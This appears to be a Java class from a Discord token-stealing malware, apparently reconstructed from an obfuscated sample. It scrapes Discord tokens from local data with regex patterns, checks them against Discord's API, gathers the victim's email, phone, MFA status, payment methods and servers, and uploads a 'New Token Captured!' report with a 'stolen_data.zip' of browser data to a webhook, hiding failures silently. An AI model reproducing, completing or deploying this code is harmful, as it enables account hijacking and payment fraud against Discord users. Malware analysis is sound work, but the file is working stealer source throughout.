import java.io.File;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.util.ArrayList;
import java.util.Base64;
import java.util.Collections;
import java.util.Comparator;
import java.util.HashMap;
import java.util.HashSet;
import java.util.LinkedHashMap;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.TimeUnit;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import org.json.JSONArray;
import org.json.JSONObject;

/**
 * Token Validator & Account Info Collector
 * Obfuscated name: ւ (U+0582)
 *
 * Validates Discord tokens and collects comprehensive account information.
 * Works in conjunction with HttpUploader (ӈ) to send data to webhooks.
 *
 * Validation process:
 * 1. Regex-filter candidate tokens from raw text
 * 2. Validate each token via Discord API (/users/@me)
 * 3. Collect account details (username, email, phone, MFA, Nitro)
 * 4. Collect payment methods
 * 5. Collect server list
 * 6. Format and send to webhook
 *
 * Token patterns (regex):
 * - Pattern 1: [MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}  (old format)
 * - Pattern 2: mfa\.[A-Za-z\d]{84}                        (MFA token)
 * - Pattern 3: [A-Za-z\d]{24}\.[\w-]{6}\.[\w-]{38}       (new format)
 *
 * Deduplication:
 * - Uses LinkedHashSet to maintain insertion order while deduplicating
 * - Tracks already-processed tokens to avoid duplicate webhook messages
 *
 * Output:
 * - Sends formatted embed to webhook via HttpUploader
 * - Includes token, user info, payment methods, server list
 * - Attaches ZIP file with browser data if available
 */
public class TokenValidator {

    // Webhook URL for this validator instance
    private final String webhookUrl;

    // HTTP uploader for sending data
    private final HttpUploader httpUploader;

    // Cache of validated tokens (token -> account info)
    private static final Map<String, JSONObject> validatedTokens;

    // Token regex patterns
    private static final Pattern TOKEN_PATTERN_OLD;    // Old format
    private static final Pattern TOKEN_PATTERN_MFA;    // MFA token
    private static final Pattern TOKEN_PATTERN_NEW;    // New format

    // =========================================================
    // CONSTRUCTOR
    // =========================================================

    /**
     * Creates a new token validator for the given webhook URL.
     *
     * @param webhookUrl Discord webhook URL to send results to
     */
    public TokenValidator(String webhookUrl) {
        this.webhookUrl = webhookUrl;
        this.httpUploader = new HttpUploader(webhookUrl);
    }

    // =========================================================
    // TOKEN EXTRACTION
    // =========================================================

    /**
     * Extracts Discord tokens from raw text using regex patterns.
     *
     * @param rawText Text to search for tokens (e.g., LevelDB content)
     * @return Deduplicated list of candidate tokens
     */
    public static List<String> extractTokens(String rawText) {
        Set<String> tokens = new LinkedHashSet<>();

        // Apply all three patterns
        extractWithPattern(TOKEN_PATTERN_OLD, rawText, tokens);
        extractWithPattern(TOKEN_PATTERN_MFA, rawText, tokens);
        extractWithPattern(TOKEN_PATTERN_NEW, rawText, tokens);

        return new ArrayList<>(tokens);
    }

    private static void extractWithPattern(Pattern pattern, String text, Set<String> results) {
        Matcher matcher = pattern.matcher(text);
        while (matcher.find()) {
            results.add(matcher.group());
        }
    }

    // =========================================================
    // TOKEN VALIDATION
    // =========================================================

    /**
     * Validates a list of tokens and sends valid ones to the webhook.
     * Processes tokens asynchronously for speed.
     *
     * @param tokens List of candidate tokens to validate
     * @param zipBuilder Optional ZipBuilder with stolen browser data
     */
    public void validateAndReport(List<String> tokens, ZipBuilder zipBuilder) {
        // Deduplicate
        Set<String> uniqueTokens = new LinkedHashSet<>(tokens);

        // Process each token asynchronously
        List<CompletableFuture<Void>> futures = new ArrayList<>();

        for (String token : uniqueTokens) {
            // Skip already processed tokens
            if (validatedTokens.containsKey(token)) continue;

            CompletableFuture<Void> future = CompletableFuture.runAsync(() -> {
                try {
                    processToken(token, zipBuilder);
                } catch (Exception ignored) {}
            });

            futures.add(future);
        }

        // Wait for all to complete (max 30 seconds)
        try {
            CompletableFuture.allOf(futures.toArray(new CompletableFuture[0]))
                .get(30, TimeUnit.SECONDS);
        } catch (Exception ignored) {}
    }

    /**
     * Validates a single token and sends account info to webhook if valid.
     *
     * @param token Token to validate
     * @param zipBuilder Optional ZIP with browser data
     */
    private void processToken(String token, ZipBuilder zipBuilder) {
        try {
            // Validate via Discord API
            JSONObject userInfo = DiscordApiClient.getUserInfo(token);
            if (userInfo == null || !userInfo.has("id")) return;

            // Cache the validated token
            validatedTokens.put(token, userInfo);

            // Collect additional info
            String nitroStatus = DiscordApiClient.getNitroStatus(token);
            List<String> paymentMethods = DiscordApiClient.getPaymentMethods(token);
            List<String> guilds = DiscordApiClient.getGuilds(token);

            // Build webhook message
            String message = formatTokenReport(token, userInfo, nitroStatus, paymentMethods, guilds);

            // Send to webhook
            if (zipBuilder != null && zipBuilder.hasData()) {
                // Send with ZIP attachment
                byte[] zipData = zipBuilder.toBytes();
                httpUploader.uploadFile("stolen_data.zip", zipData, message);
            } else {
                httpUploader.uploadMessage(message);
            }

        } catch (Exception e) {
            // Silently fail per token
        }
    }

    // =========================================================
    // FORMATTING
    // =========================================================

    /**
     * Formats a complete token report for the webhook message.
     */
    private String formatTokenReport(
            String token,
            JSONObject userInfo,
            String nitroStatus,
            List<String> paymentMethods,
            List<String> guilds) {

        StringBuilder sb = new StringBuilder();

        String username = userInfo.optString("username", "Unknown");
        String discriminator = userInfo.optString("discriminator", "0000");
        String email = userInfo.optString("email", "N/A");
        String phone = userInfo.optString("phone", "N/A");
        boolean mfa = userInfo.optBoolean("mfa_enabled", false);
        String id = userInfo.optString("id", "0");

        sb.append("**New Token Captured!**\n\n");
        sb.append("**Token:** `").append(token).append("`\n");
        sb.append("**User:** ").append(username).append("#").append(discriminator).append("\n");
        sb.append("**ID:** ").append(id).append("\n");
        sb.append("**Email:** ").append(email).append("\n");
        sb.append("**Phone:** ").append(phone).append("\n");
        sb.append("**MFA:** ").append(mfa ? "✅ Enabled" : "❌ Disabled").append("\n");
        sb.append("**Nitro:** ").append(nitroStatus).append("\n");

        if (!paymentMethods.isEmpty()) {
            sb.append("\n**💳 Payment Methods:**\n");
            for (String pm : paymentMethods) {
                sb.append("  • ").append(pm).append("\n");
            }
        }

        if (!guilds.isEmpty()) {
            sb.append("\n**🏠 Servers (").append(guilds.size()).append("):**\n");
            for (int i = 0; i < Math.min(5, guilds.size()); i++) {
                sb.append("  • ").append(guilds.get(i)).append("\n");
            }
            if (guilds.size() > 5) {
                sb.append("  ... and ").append(guilds.size() - 5).append(" more\n");
            }
        }

        return sb.toString();
    }

    // =========================================================
    // STATIC INITIALIZATION
    // =========================================================

    static {
        validatedTokens = new HashMap<>();

        // Discord token regex patterns
        TOKEN_PATTERN_OLD = Pattern.compile(
            "[MN][A-Za-z\\d]{23}\\.[\\w-]{6}\\.[\\w-]{27}"
        );
        TOKEN_PATTERN_MFA = Pattern.compile(
            "mfa\\.[A-Za-z\\d]{84}"
        );
        TOKEN_PATTERN_NEW = Pattern.compile(
            "[A-Za-z\\d]{24}\\.[\\w-]{6}\\.[\\w-]{38}"
        );
    }
}
